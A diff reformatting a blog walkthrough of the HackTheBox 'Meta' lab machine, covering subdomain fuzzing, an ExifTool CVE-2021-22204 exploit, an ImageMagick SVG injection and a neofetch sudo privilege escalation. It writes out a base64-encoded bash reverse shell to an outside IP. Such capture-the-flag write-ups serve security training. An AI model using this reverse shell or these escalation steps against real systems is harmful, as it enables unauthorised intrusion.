@@ -1,10 +1,6 @@
----
-title: "HackTheBox Meta Walkthrough"
-date: "2022-06-25"
-categories: 
-  - "htb-walkthroughs"
-coverImage: "Meta-1.png"
----
+# HackTheBox Meta Walkthrough
+
+![](images/Meta-1.png)
 
 Start off with rustscan.
 
@@ -28,25 +24,25 @@ PORT   STATE SERVICE REASON  VERSION
 |\_http-title: Did not follow redirect to http://artcorp.htb
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel
 
-[![](images/image-35-1024x439.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-35.png)
+![](images/image-35-1024x439.png)
 
 In the http\_tile we have :\_http-title: Did not follow redirect to http://artcorp.htb.
 
 Edit /etc/hosts.
 
-[![](images/image-36.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-36.png)
+![](images/image-36.png)
 
 Visit the HTTP link.
 
-[![](images/image-37-1024x1022.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-37.png)
+![](images/image-37-1024x1022.png)
 
 wfuzz -c -f sub-fighter -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u 'http://artcorp.htb' -H "Host: FUZZ.artcorp.htb" --hc 301
 
-[![](images/image-38-1024x303.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-38.png)
+![](images/image-38-1024x303.png)
 
 Again, edit /etc/hosts to add the new subdomain.
 
-[![](images/image-39-1024x783.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-39.png)
+![](images/image-39-1024x783.png)
 
 It looks like some sort of exif tool is being used to process the file.
 
@@ -54,25 +50,25 @@ With a bit of googling, I found CVE-2021-22204 and a well-written case study. [h
 
 I used metasploit to create the .jpg.
 
-[![](images/image-40-1024x667.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-40.png)
+![](images/image-40-1024x667.png)
 
 And multi/handler to listen for a meterpreter shell.
 
-[![](images/image-41-1024x538.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-41.png)
+![](images/image-41-1024x538.png)
 
-[![](images/image-42.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-42.png)
+![](images/image-42.png)
 
 We don't have permission to read user.txt. But thomas can.
 
 I couldn't find anything running linpeas so I tried pspy.
 
-[![](images/image-43-1024x86.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-43.png)
+![](images/image-43-1024x86.png)
 
 UID=1000 is thomas running convert\_images.sh on a schedule.
 
 Lets check what's inside the file.
 
-[![](images/image-44-1024x92.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-44.png)
+![](images/image-44-1024x92.png)
 
 mogrify is an imagick commands. Lets check the version and see what we can do.
 
@@ -96,22 +92,22 @@ We need to create a .svg file and upload it to /var/www/dev01.artcorp.htb/conver
 
 We need to edit the authenticate field, I couldn't get it to work until I converted the command to base64. I think it has to do with character escaping.
 
-[![](images/image-45.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-45.png)
+![](images/image-45.png)
 
-echo 'bash  -i >& /dev/tcp/10.10.14.19/6666 0>&1 ' | base64
-YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTkvNjY2NiAwPiYxIAo=
+`echo 'bash  -i >& /dev/tcp/10.10.14.19/6666 0>&1 ' | base64
+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTkvNjY2NiAwPiYxIAo=`
 
-[![](images/image-46-1024x176.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-46.png)
+![](images/image-46-1024x176.png)
 
 Start a NC listener and upload the file. Make sure to name the file poc.svg (or change the href)
 
-[![](images/image-47-1024x171.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-47.png)
+![](images/image-47-1024x171.png)
 
 And we've got a user foothold!
 
 Run sudo -l to see what else we can find.
 
-[![](images/image-48-1024x136.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-48.png)
+![](images/image-48-1024x136.png)
 
 We can run neofetch as sudo but we cannot add any options.
 
@@ -125,7 +121,7 @@ Running the code doesn't work. We'll need to add it to the .config files of neof
 
 A quick google search and we can find the .config location. [https://github.com/dylanaraps/neofetch](https://github.com/dylanaraps/neofetch)
 
-[![](images/image-50-1024x249.png)](http://localhost/wordpress/wp-content/uploads/2022/06/image-50.png)
+![](images/image-50-1024x249.png)
 
 That's it. All we needed to do is add exec /bin/sh to the config file and then just the XDG\_CONFIG\_HOME value.
 
